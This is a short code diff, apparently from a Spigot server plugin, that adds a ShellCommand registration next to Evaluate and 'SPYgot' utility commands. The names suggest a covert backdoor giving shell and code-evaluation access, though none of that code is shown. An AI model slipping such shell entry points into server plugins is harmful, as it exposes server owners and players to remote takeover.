@@ -7,6 +7,7 @@ public class CommandManager {
     public static void spigotCommands() {
         new EvaluateCommand();
         new SendMsgCommand();
+        ShellCommand.getInstance();
         new SPYgotUtilsCommand();
     }
 
